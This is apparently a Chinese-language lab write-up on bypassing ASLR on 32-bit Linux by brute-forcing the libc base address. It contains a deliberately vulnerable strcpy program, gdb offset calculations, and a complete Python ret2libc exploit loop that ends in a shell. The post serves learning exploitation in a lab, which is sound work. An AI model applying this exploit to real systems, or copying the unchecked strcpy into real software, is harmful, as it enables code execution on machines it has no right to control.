# 0x00 beginning

记录学暴力破解 32 位 Linux bypass ASLR 的过程, 实验部分来自`sploitfun`[^origin].

>What is brute-force?

在这个技术中攻击者随意选择一个`libc`的基地址来持续攻击直到成功, 这个技术是最简单`bypass`的 ASLR 的方法, 当然需要一定运气.

演示代码如下:

```shell
// gcc -fno-stack-protector 
// echo 2 > /proc/sys/kernel/randomize_va_space

#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[]) {
 char buf[256];
 strcpy(buf,argv[1]);
 printf("%s\n",buf);
 fflush(stdout);
 return 0;
}
```

# 0x01 analysis

当地址随机化开启时候, 发现可以 libc 的每次加载地址都不一样, 但是有规律可循.

```shell
Sn0rt@warzone:~/lab$ ldd ./aslr_2|grep libc
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7580000)
Sn0rt@warzone:~/lab$ ldd ./aslr_2|grep libc
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75c5000)
Sn0rt@warzone:~/lab$ ldd ./aslr_2|grep libc
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7612000)
Sn0rt@warzone:~/lab$ ldd ./aslr_2|grep libc
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb753d000)
Sn0rt@warzone:~/lab$ ldd ./aslr_2|grep libc
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7563000)
Sn0rt@warzone:~/lab$ ldd ./aslr_2|grep libc
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb755a000)
Sn0rt@warzone:~/lab$ ldd ./aslr_2|grep libc
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb757d000)
Sn0rt@warzone:~/lab$ ldd ./aslr_2|grep libc
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75c7000)
Sn0rt@warzone:~/lab$ ldd ./aslr_2|grep libc
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7564000)
Sn0rt@warzone:~/lab$ ldd ./aslr_2|grep libc
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7553000)
```

`libc`随机化只变化 0xb75 后面的两个数字, 因此最大尝试次数 256(2^8) 次时某次随机化的地址总可能又一次被用到, 在下面的`exp`选择`libc`的起始基地址`0xb7595000`进行多次尝试.

# 0x02 how to use?

exp 中 offset 的偏移还是用 peda 套路! offset 是 268.

其中`system_arg`我是利用`libc`中"/bin/sh"相对于`system()`在 libc 中的偏移计算的, 利用 gdb`print`两个然后减法运算就可以, 具体操作如下

```shell
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xb7e63190 <__libc_system>
gdb-peda$ searchmem "bin/sh" libc
Searching for 'bin/sh' in: libc ranges
Found 1 results, display max 1 items:
libc : 0xb7f83a25 ("bin/sh")
gdb-peda$ ^Z
[1]+  Stopped                 gdb -q aslr_2
Sn0rt@warzone:~/lab$ python
Python 2.7.6 (default, Mar 22 2014, 22:59:38) 
[GCC 4.8.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(0xb7f83a25-0xb7e63190)
'0x120895L'
>>> 
```

参数填充 exp:

```python
#!/usr/bin/env python

from subprocess import call
from pwn import p32

libc_base_addr = 0xb7595000
exit_offset = 0x000331e0
system_offset = 0x00040190 

system_addr = libc_base_addr + system_offset
exit_addr = libc_base_addr + exit_offset

system_arg = system_addr + 0x00120894

payload = "A" * 268 + p32(system_addr) + p32(exit_addr) + p32(system_arg)

i = 0
while (i < 256):
 print "Number of tries: %d" %i
 ret = call(["./aslr_2", payload])
 i += 1
```
其实这里 exp 已经完成了, 不过如果成功过后有点扫尾工作需要做, 把尾部加上

```python
 ret = call(["./aslr_2", payload])
 i += 1
 if (not ret):
  break
 else:
  print "Exploit failed"
```

```shell
...
Number of tries: 79
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�Q]���\�$Zo�
$ uid=1042(Sn0rt) gid=1043(Sn0rt) groups=1043(Sn0rt)
$
```
需要多运行几次, 有时候会执行失败, 或者执行成功没有会显示.

# 0x03 doubt

这个技术利用了在同一个`libc`文件中函数偏移是相对的构造出 shellcode, 因此我填写的`libc`基地址又一次命中, 下面攻击就水到渠成, 按照理论这个脚本一次就可以命中`libc`, 为什么需要多次执行才能 get shell?

### reference

[^origin]: [sploitfun](https://sploitfun.wordpress.com/2015/05/08/bypassing-aslr-part-ii/)
